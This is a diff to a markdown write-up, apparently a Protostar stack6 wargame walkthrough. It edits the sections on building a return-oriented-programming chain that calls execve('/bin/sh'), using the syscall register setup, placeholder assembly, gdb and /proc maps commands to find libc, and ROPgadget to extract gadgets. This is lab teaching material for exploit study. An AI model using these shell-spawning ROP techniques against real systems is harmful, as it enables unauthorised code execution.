@@ -242,27 +242,27 @@ If this all sounds kind of hard, then you're not alone - it is. Why would you ch
 
 So how do you figure out which gadgets you need to use? This will depend on what you want to do. In our case, we're trying to execute an arbitrary program (just like with ret2libc) and the way we are going to do this is by using the `execve` syscall. From the man-page we need to setup a few registers for this to work and then perform a syscall interrupt:
 
-```bash
+```
 EAX = 11 (or 0x0B in hex) – The execve syscall number
 EBX = Address in memory of the string “/bin/sh”
-ECX = Address of a pointer to the string “/bin/sh”
-EDX = null
+ECX = Address of a pointer to the string “/bin/sh”, for our purposes
+EDX = null, for our purposes
 ```
 
-In order to figure out which gadgets we should use we will write our payload in assembly so that it will achieve the above steps, and then attempt to find the most relevant gadgets. So, step one:
+In order to figure out which gadgets we should use we will write our payload in assembly so that it will achieve the above steps, and then attempt to find the most relevant gadgets. Step one, write the assembly:
 
 ```arm
 xor  edx, edx
 push edx
 mov  ecx, esp
 mov  eax, 0xb
-push 0x00
-push 0x
+push 0x00     <---- fix this to contain /sh\x00
+push 0x00     <---- fix this to contain /bin
 mov  ebx, esp
 int  0x80
 ```
 
-Step two would be finding our gadgets! First lets look at the shared libraries that this binary is linking to by using gdb:
+Step two would be finding our gadgets! First lets look at the shared libraries that this binary is linking to by using gdb, so that we can search them for gadgets:
 ```bash
 $ gdb -q ./stack6 
 (gdb) b main
@@ -274,18 +274,25 @@ From        To          Syms Read   Shared Object Library
 0xb7fe3830  0xb7ff988f  Yes (*)     /lib/ld-linux.so.2
 0xb7eada50  0xb7fa14cc  Yes (*)     /lib/libc.so.6
 ```
-No surprises there, libc is everpresent! Now to find out where it's being loaded, we will need to inspect it
+
+No surprises there, libc is everpresent! Now to find out where it's being loaded, we will need to inspect the processe's process memory maps:
 
 ```bash
-user@protostar:/opt/protostar/bin$ ps aux | grep -e '[s]tack6'
+$ ps aux | grep -e '[s]tack6'
 root      2265  0.0  0.0   1536   320 pts/1    S+   01:37   0:00 /opt/protostar/bin/stack6
-root@protostar:/opt/protostar/bin# cat /proc/2265/maps
+# cat /proc/2265/maps
 ....
 b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so <-- this
 ....
 ```
 
+So it looks like libc is loaded at base address `0xb7e97000`. Now we basically just have to find gadgets in libc. For this we are going to use a tool called ROPgadget[8], after we download libc from the protostar machine. To extract all the gadgets, run `ROPgadget --binary ../bin/libc.so.6 > libc_gadgets.txt`. And now let the most arduous process known to man begin - finding gadgets for our shellcode!
+
 ### Exploitation
+
+As a first step, I tried to find the exact instructions that I needed but I had no luck.
+
+This is the final exploit that I can up with:
 
 ```python
 import struct
@@ -354,3 +361,4 @@ I have a new approach!
 [5] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Randomization
 [6] - https://www.shellblade.net/files/docs/ret2libc.pdf
 [7] - https://security.stackexchange.com/questions/36462/
+[8] - https://github.com/JonathanSalwan/ROPgadget
